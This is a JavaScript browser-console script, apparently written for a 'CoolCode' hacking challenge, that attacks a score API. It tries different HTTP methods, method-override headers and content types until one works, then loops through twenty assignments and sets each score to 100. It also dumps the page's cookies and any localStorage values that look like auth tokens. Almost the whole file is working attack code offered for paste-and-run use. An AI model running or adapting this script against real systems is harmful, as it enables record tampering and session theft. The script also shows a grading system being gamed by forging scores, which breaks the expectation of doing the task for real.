// CoolCode Challenge Browser Script
// Copy and paste this into the browser console while on the CoolCode website

console.log("🔥 CoolCode Challenge Browser Hacker 🔥");
console.log("Target: Override assignment scores to 100");
console.log("Your username: CX8de3ce71-3cbTY");

// Configuration
const CONFIG = {
    username: "CX8de3ce71-3cbTY",
    baseUrl: "https://coolcode-hacker-34c5455cd908.herokuapp.com",
    scoreApi: "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score",
    maxAssignments: 20
};

// Helper function to log with colors
function log(message, type = 'info') {
    const styles = {
        info: 'color: #3498db;',
        success: 'color: #27ae60; font-weight: bold;',
        error: 'color: #e74c3c; font-weight: bold;',
        warning: 'color: #f39c12; font-weight: bold;',
        hack: 'color: #9b59b6; font-weight: bold;'
    };
    
    console.log(`%c${message}`, styles[type] || styles.info);
}

// Function to make API requests with different methods
async function testScoreAPI(method = 'POST', payload = null, headers = {}) {
    const url = CONFIG.scoreApi;
    
    const defaultPayload = {
        username: CONFIG.username,
        assignmentId: 1,
        score: 100
    };
    
    const requestPayload = payload || defaultPayload;
    
    const defaultHeaders = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        ...headers
    };
    
    try {
        const options = {
            method: method,
            headers: defaultHeaders
        };
        
        if (['POST', 'PUT', 'PATCH'].includes(method)) {
            if (defaultHeaders['Content-Type'] === 'application/json') {
                options.body = JSON.stringify(requestPayload);
            } else if (defaultHeaders['Content-Type'] === 'application/x-www-form-urlencoded') {
                const formData = new URLSearchParams();
                Object.keys(requestPayload).forEach(key => {
                    formData.append(key, requestPayload[key]);
                });
                options.body = formData;
            }
        }
        
        log(`Testing ${method} ${url}`, 'info');
        log(`Payload: ${JSON.stringify(requestPayload)}`, 'info');
        log(`Headers: ${JSON.stringify(defaultHeaders)}`, 'info');
        
        const response = await fetch(url, options);
        const responseText = await response.text();
        
        log(`Response: ${response.status} ${response.statusText}`, 
            response.ok ? 'success' : 'error');
        log(`Body: ${responseText}`, 'info');
        
        if (response.ok) {
            log(`🎉 SUCCESS! ${method} method works!`, 'success');
            return { success: true, method, response };
        }
        
        return { success: false, status: response.status, response: responseText };
        
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
        return { success: false, error: error.message };
    }
}

// Function to test all HTTP methods
async function testAllMethods() {
    log("🔍 Testing all HTTP methods...", 'hack');
    
    const methods = ['POST', 'PUT', 'PATCH', 'GET'];
    const results = [];
    
    for (const method of methods) {
        const result = await testScoreAPI(method);
        results.push({ method, ...result });
        
        if (result.success) {
            log(`✅ Found working method: ${method}`, 'success');
            return { method, success: true };
        }
        
        // Wait a bit between requests
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    return { success: false, results };
}

// Function to test method override headers
async function testMethodOverrides() {
    log("🔧 Testing HTTP method override headers...", 'hack');
    
    const overrides = [
        { method: 'GET', headers: { 'X-HTTP-Method-Override': 'POST' } },
        { method: 'GET', headers: { 'X-HTTP-Method-Override': 'PUT' } },
        { method: 'POST', headers: { 'X-HTTP-Method-Override': 'PUT' } },
        { method: 'POST', headers: { 'X-HTTP-Method': 'PUT' } },
        { method: 'POST', headers: { 'X-Requested-With': 'XMLHttpRequest' } }
    ];
    
    for (const override of overrides) {
        const result = await testScoreAPI(override.method, null, override.headers);
        
        if (result.success) {
            log(`✅ Method override works: ${JSON.stringify(override)}`, 'success');
            return { ...override, success: true };
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    return { success: false };
}

// Function to test different content types
async function testContentTypes() {
    log("📄 Testing different content types...", 'hack');
    
    const contentTypes = [
        'application/json',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'text/plain'
    ];
    
    for (const contentType of contentTypes) {
        const result = await testScoreAPI('POST', null, { 'Content-Type': contentType });
        
        if (result.success) {
            log(`✅ Content type works: ${contentType}`, 'success');
            return { contentType, success: true };
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    return { success: false };
}

// Function to hack all assignments
async function hackAllAssignments(workingMethod = 'POST', workingHeaders = {}) {
    log("🚀 Attempting to hack all assignments...", 'hack');
    
    const successfulAssignments = [];
    
    for (let assignmentId = 1; assignmentId <= CONFIG.maxAssignments; assignmentId++) {
        const payload = {
            username: CONFIG.username,
            assignmentId: assignmentId,
            score: 100
        };
        
        const result = await testScoreAPI(workingMethod, payload, workingHeaders);
        
        if (result.success) {
            log(`✅ Assignment ${assignmentId}: Score set to 100!`, 'success');
            successfulAssignments.push(assignmentId);
        } else {
            log(`❌ Assignment ${assignmentId}: Failed`, 'error');
        }
        
        // Small delay between requests
        await new Promise(resolve => setTimeout(resolve, 200));
    }
    
    log(`🎯 Hacked ${successfulAssignments.length}/${CONFIG.maxAssignments} assignments!`, 'success');
    
    if (successfulAssignments.length > 0) {
        log(`Successful assignments: ${successfulAssignments.join(', ')}`, 'success');
        log("🎉 CHALLENGE COMPLETED!", 'success');
    }
    
    return successfulAssignments;
}

// Main execution function
async function runCoolCodeHack() {
    log("🔥 Starting CoolCode Challenge Hack", 'hack');
    log("=======================================", 'info');
    
    // Step 1: Test direct API access
    log("Step 1: Testing direct API access...", 'info');
    const directResult = await testScoreAPI();
    
    if (directResult.success) {
        log("🚨 API is accessible without authentication!", 'success');
        await hackAllAssignments();
        return;
    }
    
    // Step 2: Test different HTTP methods
    log("Step 2: Testing different HTTP methods...", 'info');
    const methodResult = await testAllMethods();
    
    if (methodResult.success) {
        await hackAllAssignments(methodResult.method);
        return;
    }
    
    // Step 3: Test method overrides
    log("Step 3: Testing method override headers...", 'info');
    const overrideResult = await testMethodOverrides();
    
    if (overrideResult.success) {
        await hackAllAssignments(overrideResult.method, overrideResult.headers);
        return;
    }
    
    // Step 4: Test content types
    log("Step 4: Testing different content types...", 'info');
    const contentTypeResult = await testContentTypes();
    
    if (contentTypeResult.success) {
        await hackAllAssignments('POST', { 'Content-Type': contentTypeResult.contentType });
        return;
    }
    
    log("❌ All automated attempts failed", 'error');
    log("💡 Manual investigation required:", 'warning');
    log("1. Login to the CoolCode UI", 'info');
    log("2. Look for legitimate score submission requests in Network tab", 'info');
    log("3. Copy the working request format", 'info');
}

// Quick test function
async function quickTest() {
    log("⚡ Quick test of score API...", 'hack');
    
    const result = await testScoreAPI('POST', {
        username: CONFIG.username,
        assignmentId: 1,
        score: 100
    });
    
    if (result.success) {
        log("🎉 Quick test successful! Running full hack...", 'success');
        await hackAllAssignments();
    } else {
        log("❌ Quick test failed. Running full diagnostic...", 'warning');
        await runCoolCodeHack();
    }
}

// Helper function to get current authentication state
function getAuthInfo() {
    log("🔍 Checking authentication state...", 'info');
    
    // Check cookies
    const cookies = document.cookie;
    log(`Cookies: ${cookies}`, 'info');
    
    // Check localStorage
    const localStorageKeys = Object.keys(localStorage);
    log(`LocalStorage keys: ${localStorageKeys.join(', ')}`, 'info');
    
    // Check sessionStorage
    const sessionStorageKeys = Object.keys(sessionStorage);
    log(`SessionStorage keys: ${sessionStorageKeys.join(', ')}`, 'info');
    
    // Look for common auth tokens
    const authTokens = localStorageKeys.filter(key => 
        key.toLowerCase().includes('token') || 
        key.toLowerCase().includes('auth') ||
        key.toLowerCase().includes('session')
    );
    
    if (authTokens.length > 0) {
        log(`Potential auth tokens found: ${authTokens.join(', ')}`, 'success');
        authTokens.forEach(key => {
            log(`${key}: ${localStorage.getItem(key)}`, 'info');
        });
    }
}

// Export functions for manual use
window.coolCodeHack = {
    run: runCoolCodeHack,
    quickTest: quickTest,
    testAPI: testScoreAPI,
    hackAll: hackAllAssignments,
    getAuth: getAuthInfo,
    config: CONFIG
};

log("🔥 CoolCode hacker loaded!", 'success');
log("Usage:", 'info');
log("  coolCodeHack.quickTest() - Quick test and hack", 'info');
log("  coolCodeHack.run() - Full diagnostic and hack", 'info');
log("  coolCodeHack.getAuth() - Check authentication state", 'info');
log("  coolCodeHack.testAPI('PUT') - Test specific method", 'info');
log("", 'info');
log("🚀 Run coolCodeHack.quickTest() to start!", 'hack');
